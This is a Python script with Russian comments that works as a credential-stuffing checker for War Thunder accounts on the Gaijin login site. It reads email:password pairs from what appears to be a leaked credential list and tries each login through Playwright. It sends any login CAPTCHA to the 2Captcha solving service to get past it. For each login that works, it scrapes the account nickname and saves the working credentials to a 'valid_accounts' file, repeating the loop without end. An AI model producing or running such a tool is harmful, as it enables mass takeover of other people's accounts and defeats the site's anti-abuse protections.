import asyncio
from playwright.async_api import async_playwright
from twocaptcha import TwoCaptcha
from loguru import logger
import os

# Инициализация 2Captcha с API ключом
API_KEY = ""
solver = TwoCaptcha(API_KEY)

os.makedirs('valid_accounts', exist_ok=True)


async def solve_captcha_with_2captcha(page, captcha_selector: str) -> str:
    """
    Решение CAPTCHA через 2Captcha с использованием Playwright для скриншота.
    """
    try:
        logger.info("🖼️ Создание скриншота CAPTCHA через Playwright...")

        # Делаем скриншот CAPTCHA
        captcha_image_path = 'captcha_image.png'
        captcha_element = await page.wait_for_selector(captcha_selector)
        await captcha_element.screenshot(path=captcha_image_path)

        # Отправляем изображение в 2Captcha
        result = solver.normal(captcha_image_path)
        captcha_text = result['code']
        logger.success(f"✅ CAPTCHA решена: {captcha_text}")
        return captcha_text

    except Exception as e:
        logger.error(f"❌ Ошибка при решении CAPTCHA через 2Captcha: {e}")
        return ""


async def save_valid_account(email: str, password: str, nickname: str):
    """
    Сохранение валидного аккаунта в файл.
    """
    valid_file_path = os.path.join('valid_accounts', 'warthunder_valid.txt')
    with open(valid_file_path, 'a', encoding='utf-8') as f:
        f.write(f"{email}:{password}:{nickname}\n")
    logger.success(f"💾 Валидный аккаунт сохранён: {email}:{password}:{nickname}")


async def login_warthunder(email: str, password: str) -> bool:
    """
    Попытка авторизации на War Thunder с использованием указанных email и пароля.
    Возвращает True, если авторизация успешна, иначе False.
    """
    if '@' not in email:
        logger.warning(f"⚠️ Некорректный email: {email}")
        return False

    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=False)
            page = await browser.new_page()

            await page.goto("https://login.gaijin.net/", timeout=60000)
            await page.wait_for_load_state("networkidle")

            email_field = await page.wait_for_selector('input[name="login"]', timeout=5000)
            await email_field.fill(email)

            password_field = await page.wait_for_selector('input[type="password"]', timeout=5000)
            await password_field.fill(password)

            captcha_image = await page.query_selector('img#captcha-img')
            if captcha_image:
                logger.info("🛡️ CAPTCHA обнаружена. Попытка распознавания через 2Captcha...")

                captcha_text = await solve_captcha_with_2captcha(page, 'img#captcha-img')

                if captcha_text:
                    captcha_field = await page.wait_for_selector('input[name="captcha"]', timeout=5000)
                    await captcha_field.fill(captcha_text)
                    logger.info(f"✅ CAPTCHA введена: {captcha_text}")
                else:
                    logger.error("❌ Не удалось распознать CAPTCHA.")
                    await browser.close()
                    return False

            login_btn = await page.wait_for_selector(".input-button-main.js-anti-several-clicks", timeout=5000)
            await login_btn.click()

            await page.wait_for_timeout(3000)

            # Проверяем успешность авторизации
            if "https://login.gaijin.net/" not in page.url:
                logger.success(f"✅ Успешный вход: {email}")
                await asyncio.sleep(5)
                # Поиск ника пользователя
                nickname_element = await page.query_selector('.profile-user__username')
                if nickname_element:
                    nickname_text = await nickname_element.inner_text()
                    nickname_clean = nickname_text.strip().split('\n')[0]
                    logger.success(f"🏷️ Найден ник: {nickname_clean}")
                    await save_valid_account(email, password, nickname_clean)
                else:
                    logger.warning("❌ Ник пользователя не найден.")

                await browser.close()
                return True
            else:
                logger.warning(f"❌ Не удалось войти: {email}")
                await browser.close()
                return False

    except Exception as e:
        logger.error(f"⚠️ Ошибка при авторизации {email}: {e}")
        return False


async def main():
    """
    Бесконечная проверка данных из файла для авторизации.
    """
    while True:
        try:
            with open("filtered_results/warthunder.txt", "r", encoding="utf-8") as file:
                credentials = [line.strip() for line in file if ':' in line]

            for cred in credentials:
                parts = cred.split(":", 1)
                if len(parts) == 2:
                    email, password = parts
                    success = await login_warthunder(email.strip(), password.strip())
                    await asyncio.sleep(2)
                else:
                    logger.warning(f"⚠️ Неправильный формат строки: {cred}")

        except FileNotFoundError:
            logger.error("❌ Файл warthunder.txt не найден.")
            break
        except Exception as e:
            logger.error(f"⚠️ Произошла ошибка: {e}")

        logger.info("🔄 Перезапуск процесса через 10 секунд...")
        await asyncio.sleep(10)


if __name__ == "__main__":
    asyncio.run(main())
